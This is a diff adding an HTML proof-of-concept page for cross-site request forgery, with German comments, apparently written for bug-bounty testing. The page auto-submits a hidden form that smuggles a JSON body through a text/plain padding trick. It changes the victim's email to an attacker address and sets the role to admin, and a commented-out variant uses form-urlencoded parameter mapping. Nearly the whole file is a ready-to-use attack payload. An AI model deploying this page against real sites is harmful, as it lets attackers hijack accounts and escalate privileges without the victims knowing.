@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<!--
+  CSRF-PoC: JSON-Body über einfaches Formular (kein CORS-Preflight).
+
+  Variante 1: enctype="text/plain" — der Trick mit dem Padding-Feld erzeugt einen
+  syntaktisch gültigen JSON-Body, weil Browser "name=value" sendet:
+    name = '{"ignore":"' , value = '","email":"a@b.c","x":"y"}'
+    Body: {"ignore":"=","email":"a@b.c","x":"y"}
+  Viele JSON-Parser schlucken das unbekannte erste Feld.
+
+  Variante 2 (auskommentiert): form-urlencoded mit Parameter-Mapping
+  (Rails/Laravel/Django-Stil) — testen, wenn Variante 1 scheitert.
+
+  Nur auf autorisierte Bug-Bounty-Targets anwenden, nur mit eigenen Testaccounts.
+-->
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC (JSON)</title></head>
+<body>
+
+<!-- Variante 1: text/plain -->
+<form id="f" method="POST" action="https://TARGET.example/ACTION_PATH" enctype="text/plain">
+  <input type="hidden"
+         name='{"ignore":"'
+         value='","email":"attacker@example.com","role":"admin"}'>
+</form>
+
+<!--
+Variante 2: Parameter-Mapping
+<form id="f" method="POST" action="https://TARGET.example/ACTION_PATH">
+  <input type="hidden" name="user[email]" value="attacker@example.com">
+  <input type="hidden" name="user[role]" value="admin">
+</form>
+-->
+
+<script>document.getElementById('f').submit();</script>
+</body>
+</html>
